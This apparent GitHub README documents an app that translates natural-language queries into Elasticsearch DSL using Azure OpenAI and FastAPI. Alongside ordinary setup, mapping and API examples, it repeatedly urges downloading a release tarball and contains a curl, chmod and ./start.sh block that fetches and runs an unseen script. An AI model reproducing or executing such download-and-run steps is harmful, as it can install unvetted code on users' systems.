[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/keyboard12347494569/elastic_semantic_search/releases)

Smart Elastic Semantic Search with Azure OpenAI and FastAPI
![Smart Elastic Search Logo](diagrams/logo.png)

A natural language to Elasticsearch DSL translation system that uses Azure OpenAI. The app converts human queries into Elasticsearch DSL. It runs searches against structured indices and returns ranked results plus concise summaries.

Table of contents
- Features
- Architecture
- Quick start
- Requirements
- Repository layout
- Install and run (local and Docker)
- Environment variables
- Index mapping and ingest pipeline
- CSV ingestion workflow
- Prompt design and examples
- Using the API (endpoints and examples)
- Aggregations and rollups
- Result summarization and LLM output
- Testing and validation
- Development notes
- Contributing
- Releases
- License
- Repository topics

Features
- Natural language to Elasticsearch DSL translation using Azure OpenAI GPT.
- REST API built with FastAPI and served by Uvicorn.
- Search result summarization using LLM prompts.
- Aggregations: counts, top-N, group-by, rollups.
- CSV ingestion flow with an Elasticsearch ingest pipeline.
- Docker Compose setup for the app, ES, and Kibana.
- Prompt engineering with few-shot examples for DSL generation.
- Basic validation and JSON schema checks for generated DSL.

Architecture
![Architecture](diagrams/architecture.drawio.svg)

The app sits between the user and Elasticsearch. Users send natural language queries to the API. The API formats a prompt and sends it to Azure OpenAI via the openai Python SDK. The model returns a structured Elasticsearch DSL snippet. The API validates the DSL, runs the query in Elasticsearch, and returns results. The API can also ask the LLM to summarize results or to produce rollup aggregates.

Quick start

Prerequisites
- Docker and Docker Compose
- Python 3.10+
- An Elasticsearch 8.x cluster (the Docker Compose file in the repo provides one)
- An Azure OpenAI key and endpoint or an OpenAI-compatible endpoint with the openai SDK credentials
- Basic shell and curl

Clone the repo and open the Releases page to get prebuilt artifacts and helper scripts:
- Visit the releases page: https://github.com/keyboard12347494569/elastic_semantic_search/releases
- Download the artifact named elastic_semantic_search_release.tar.gz from the releases page and execute the included start script as shown in the Releases section below.

Local quick run (Docker Compose)
1. Copy the example env file:
```
cp .env.sample .env
```
2. Edit .env and set AZURE_OPENAI_KEY, AZURE_OPENAI_ENDPOINT, and ES passwords.
3. Start services:
```
docker compose up -d
```
4. Open FastAPI docs:
- Swagger UI: http://localhost:8000/docs
- Redoc: http://localhost:8000/redoc

Requirements

- Python 3.10+
- pip
- Docker 20.10+
- docker-compose v2
- Elasticsearch 8.x (Docker image or managed service)
- Azure OpenAI access (or an OpenAI-compatible endpoint and key)

Repository layout

elastic_semantic_search/
├── app/                    # Core app logic: ES client, LLM client, prompts, validation
│   ├── es.py               # Elasticsearch helper functions
│   ├── llm.py              # LLM client and prompt builders
│   ├── prompts.py          # Prompt templates and few-shot examples
│   ├── api.py              # FastAPI endpoints and request handlers
│   ├── ingest.py           # CSV ingestion helpers and ES pipelines
│   ├── schemas.py          # Pydantic models and JSON schema validation
│   └── utils.py            # Utility helpers
├── docker/                 # Docker configs and helper scripts
│   ├── Dockerfile
│   └── docker-compose.yml
├── diagrams/               # Images and architecture diagrams
│   ├── logo.png
│   └── architecture.drawio.svg
├── tests/                  # Unit and integration tests
├── .env.sample
├── requirements.txt
├── README.md
└── scripts/                # Utility scripts for deploy and maintenance

Install and run (detailed)

1) Python virtualenv method
- Create venv:
```
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```
- Export env variables or use .env:
```
export AZURE_OPENAI_KEY="your_key_here"
export AZURE_OPENAI_ENDPOINT="https://your-endpoint.openai.azure.com"
export ES_HOST="http://localhost:9200"
export ES_USERNAME="elastic"
export ES_PASSWORD="changeme"
```
- Start the app:
```
uvicorn app.api:app --host 0.0.0.0 --port 8000 --reload
```
- The API will serve Swagger at /docs.

2) Docker Compose method
- Update .env from .env.sample.
- Start:
```
docker compose up -d
```
- Use docker logs to inspect services:
```
docker compose logs -f web
```

Environment variables

- AZURE_OPENAI_KEY — Azure OpenAI API key or OpenAI API key.
- AZURE_OPENAI_ENDPOINT — Endpoint URL for Azure OpenAI or OpenAI-compatible endpoint.
- AZURE_DEPLOYMENT_NAME — Deployment name or model alias.
- ES_HOST — Elasticsearch host URL (http://elasticsearch:9200 for Docker Compose).
- ES_USERNAME — Elasticsearch username.
- ES_PASSWORD — Elasticsearch password.
- INGEST_PIPELINE_NAME — Name for the ES ingest pipeline used for CSV.
- LOG_LEVEL — Logging verbosity.

Index mapping and ingest pipeline

Index mapping
- Define mappings for structured fields you will search against.
- Use keyword for exact matches and text with a standard analyzer for full text.
- Use date type for timestamps and numeric types for counts and amounts.

Sample mapping
```
PUT /products
{
  "mappings": {
    "properties": {
      "product_id": { "type": "keyword" },
      "title":      { "type": "text" },
      "description":{ "type": "text" },
      "category":   { "type": "keyword" },
      "price":      { "type": "float" },
      "in_stock":   { "type": "boolean" },
      "created_at": { "type": "date" }
    }
  }
}
```

Ingest pipeline for CSV
- The repo provides an ingest pipeline that parses and normalizes CSV fields.
- The pipeline can drop empty fields and enforce types.

Sample ingest pipeline definition
```
PUT _ingest/pipeline/csv_pipeline
{
  "description": "Parse CSV fields and coerce types",
  "processors": [
    { "csv": { "field": "message", "target_field": "doc" } },
    { "rename": { "field": "doc.product_id", "target_field": "product_id" } },
    { "convert": { "field": "doc.price", "type": "float", "ignore_missing": true } },
    { "date": { "field": "doc.created_at", "formats": ["ISO8601"], "ignore_missing": true } }
  ]
}
```

CSV ingestion workflow
- Prepare a CSV file with headers that match fields in the index mapping.
- Use the ingest pipeline to process each row.
- You can use the repo's ingest script or submit documents directly via the ES bulk API.

Example using the repo script
```
python app.ingest.py --file data/products.csv --index products --pipeline csv_pipeline
```

Prompt design and examples

The app uses prompt engineering to get the LLM to return safe, valid Elasticsearch DSL. Prompts include:
- System instruction: high-level goals and constraints.
- Few-shot examples: pair plain query with expected DSL.
- Schema snippet: show allowed fields and types.
- Output format request: JSON only, no explanation.

Goal of a prompt
- Map user intent to filters, full-text queries, sorts, pagination, and aggregations.
- Keep DSL simple and predictable.
- Avoid injecting raw user text into DSL fields that may break syntax.

Example few-shot pair
User: "Find top 5 laptops under $1000, sort by rating"
LLM DSL:
```
{
  "size": 5,
  "query": {
    "bool": {
      "must": [
        { "range": { "price": { "lte": 1000 } } },
        { "match": { "category": "laptop" } }
      ]
    }
  },
  "sort": [{ "rating": "desc" }]
}
```

Prompt pattern
- Begin with a short system instruction: "Return valid Elasticsearch v8 DSL as compact JSON only."
- Provide 3-5 examples.
- Append allowed fields and types.
- End with the user's natural language query.

Using the API (endpoints and examples)

Main endpoints
- POST /search — send a natural language query and optional controls (size, aggregations).
- POST /translate — ask the model to return DSL only, without executing it.
- POST /ingest/csv — submit a CSV file or point to an S3 URL to ingest rows via pipeline.
- GET /health — service and ES health.

Search endpoint example (curl)
```
curl -X POST "http://localhost:8000/search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "Top 3 cordless drills under $150 with battery included",
    "size": 3,
    "aggregations": ["brand", "price_ranges"]
  }'
```

Search response structure
- query: the original text.
- dsl: the DSL produced by the LLM.
- es_response: raw response from Elasticsearch.
- summary: short natural language summary produced by the LLM.
- aggregates: structured aggregation output when requested.

Translate endpoint example
```
curl -X POST "http://localhost:8000/translate" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "List all orders from last month for customer 123 only",
    "max_size": 100
  }'
```
- The endpoint returns a JSON DSL object suitable to submit to ES.

Aggregation and rollup examples

Top N values per category
- Use terms aggregation with size N.

Example DSL
```
{
  "size": 0,
  "aggs": {
    "top_categories": {
      "terms": { "field": "category", "size": 10 }
    }
  }
}
```

Counts per time window
- Use date_histogram with format and interval.

Example DSL
```
{
  "size": 0,
  "aggs": {
    "sales_over_time": {
      "date_histogram": {
        "field": "created_at",
        "calendar_interval": "day"
      },
      "aggs": {
        "total_sales": { "sum": { "field": "price" } }
      }
    }
  }
}
```

Rollups and pre-aggregations
- Use Elasticsearch rollup jobs for long-term aggregated storage.
- The API can generate rollup DSL or suggest a rollup job configuration.

Result summarization and LLM output

The API can ask a model to produce a short summary of search results. Use a compact prompt that gives:
- A context snippet: top 3 hits with key fields.
- A task: create a 2-3 sentence summary and list the 3 most relevant items.
- A format: JSON with keys summary and top_hits.

Example summary prompt fragment
- Context:
  - Item A: title, price, snippet
  - Item B: ...
- Instruction: "Return JSON with summary and top_hits array. Keep summary under 40 words."

Generated output
```
{
  "summary": "Three compact cordless drills with long battery life and good value under $150.",
  "top_hits": [
    {"title": "Drill X", "price": 129.99, "reason": "highest rating"},
    {"title": "Drill Y", "price": 99.99, "reason": "best battery life"},
    {"title": "Drill Z", "price": 119.99, "reason": "best value"}
  ]
}
```

Testing and validation

Unit tests
- The tests folder includes unit tests for:
  - DSL validation
  - Prompt templates
  - ES helper functions
  - Ingest pipeline behavior

Run tests
```
pytest -q
```

Integration tests
- The repo provides containers for ES and the web app.
- Use docker compose to run integration tests against the local ES image.

Validation strategy
- Validate the JSON output returned by the model.
- Check that query uses only allowed fields.
- Sanitize user inputs when included in DSL (escape or map to accepted fields).

Development notes

- Use the openai Python SDK to call the LLM. The repo wraps calls in app/llm.py to allow swapping clients.
- Keep prompts short and deterministic. Use few-shot examples that cover common cases.
- When adding a new field to an index, update prompts with the field name and type.
- Test DSL produced by the model before running it. The app includes a small DSL linter that checks for unsupported keywords and suspicious user injections.

Contributing

- Fork the repo.
- Create a feature branch.
- Run unit tests locally.
- Open a pull request with a clear description and tests.
- Keep PRs small and focused.

Releases
[![Download Release](https://img.shields.io/badge/Release-Assets-blue?logo=github)](https://github.com/keyboard12347494569/elastic_semantic_search/releases)

This project publishes binaries and helper scripts in Releases. Download the release artifact and run the included start script. Example artifact name and instructions:

1) Visit the releases page:
https://github.com/keyboard12347494569/elastic_semantic_search/releases

2) Download the artifact named
elastic_semantic_search_release_v1.0.0.tar.gz
(or similar artifact from the page).

3) Example commands to download and run the artifact:
```
curl -L -o elastic_semantic_search_release_v1.0.0.tar.gz \
  "https://github.com/keyboard12347494569/elastic_semantic_search/releases/download/v1.0.0/elastic_semantic_search_release_v1.0.0.tar.gz"

tar -xzf elastic_semantic_search_release_v1.0.0.tar.gz
cd elastic_semantic_search_release_v1.0.0
chmod +x start.sh
./start.sh
```
The start.sh script will set up the environment and launch the Docker Compose stack or launch the prebuilt binaries depending on the release.

If the release link is not reachable or you need a different artifact, check the "Releases" section on the repository page for the latest assets and instructions:
https://github.com/keyboard12347494569/elastic_semantic_search/releases

Security and safe usage

- Keep your AZURE_OPENAI_KEY secret. Store it in secret storage or a secure environment.
- Limit model output length to prevent large payloads.
- Validate model-generated DSL before executing it against ES.
- When exposing the search API publicly, add auth and rate limits.

Common operations

Reindexing
- When your mapping needs a change, create a new index, reindex data, then switch an alias.

Bulk import
- Use the bulk API for large CSV imports after converting rows to JSON.
- The ingest pipeline can run during bulk ingestion to parse and coerce types.

Exporting results
- The API supports CSV export of search results.
- Use paged queries and stream results to a CSV writer.

Monitoring and logging

- Use standard logging in the app. Log at info for user actions and at debug for LLM prompts and ES DSL.
- In production, send logs to a centralized system like Elastic Observability or a hosted log service.
- Monitor ES cluster health and disk usage. The app checks ES cluster health at startup.

Performance tips

- Use appropriate index mappings to avoid costly analysis on fields used for filters.
- Add runtime fields only when needed.
- Cache common aggregations in application memory if they run often.
- Use size and from to paginate. For deep pagination use search_after or scroll for batch exports.

Examples: typical queries and how they map

1) Faceted search
User: "Show me women's jackets in size M under $200, group results by brand and color"
DSL basics:
- bool filter for category, size, range for price
- terms aggregation for brand and color

2) Time range and top contributors
User: "Top 10 customers by sales in the last 30 days"
DSL basics:
- range query on created_at
- terms aggregation on customer_id with sum sub-aggregation on amount
- sort by sub-aggregation

3) Mixed text + filter
User: "Laptops with 'OLED' in description and at least 16GB RAM"
DSL basics:
- match query for description
- term or range for RAM depending on index mapping

Code snippets (Python)

Run a search with the SDK wrapper
```
from app.llm import LLMClient
from app.es import ESClient

llm = LLMClient(api_key=os.getenv("AZURE_OPENAI_KEY"), endpoint=os.getenv("AZURE_OPENAI_ENDPOINT"))
es = ESClient(host=os.getenv("ES_HOST"), user=os.getenv("ES_USERNAME"), password=os.getenv("ES_PASSWORD"))

query_text = "Find top 5 budget tablets under $250"
dsl = llm.translate_to_dsl(query_text)
es_resp = es.search(index="products", body=dsl)
summary = llm.summarize_results(es_resp["hits"]["hits"])
```

Testing LLM prompt locally
- The repo includes a prompt debug tool to test and refine prompt templates without running a full query.

Maintenance and upgrade

- Keep Elasticsearch and the client libraries aligned to the same major version.
- When upgrading models, run regression tests for prompt output and DSL format.
- If you change the prompt schema, update saved prompt examples to reflect the new shape.

Changelog
- Maintain a changelog in CHANGELOG.md and publish release notes to GitHub Releases.

License
- The repo uses the MIT License. See LICENSE file.

Repository topics
- ai
- azure
- docker
- docker-compose
- elasticsearch
- fastapi
- kibana
- llm
- openai
- pandas
- python
- restful-api
- semantic-search
- smart-search
- swagger-ui
- uv
- uvicorn

Appendix: sample prompts and validations

A. System prompt (short)
- "You are a helper that converts a plain user query into valid Elasticsearch v8 DSL. Only return JSON. Use only the fields in the schema. Do not add explanation."

B. Few-shot examples
- Provide 4 examples that map queries to DSL.

C. Output validation checklist
- Is the output valid JSON?
- Does it include only permitted fields?
- Does size fall within allowed range?
- Are numeric ranges used for numeric filters?

D. Example validation code (concept)
```
def validate_dsl(dsl_json, allowed_fields):
    # parse JSON
    # traverse queries
    # ensure only allowed_fields used
    # ensure no scripts or exec code
    # return True or raise ValidationError
```

Developer tips

- Use a modular prompt builder to change only parts of the prompt depending on query complexity.
- Keep a test suite of common queries and expected DSL to detect model drift.
- Log the prompt and the returned DSL for audit and debugging.
- Consider model caching for repeated identical NL queries to reduce cost.

Images and visuals
- Use the diagrams/ folder for your logo and architecture diagram.
- Use the architecture SVG to show data flow during demos.

Contact and support
- Open issues on GitHub for bugs and feature requests.
- Submit pull requests with tests.

Assets and helper scripts
- The Releases page contains compiled assets and scripts for a quick start. Download and run the release artifact as shown above.

Visit Releases
- For prebuilt assets and detailed install scripts, visit:
https://github.com/keyboard12347494569/elastic_semantic_search/releases

The README provides a full guide to run, extend, and operate the Smart Elastic Semantic Search system.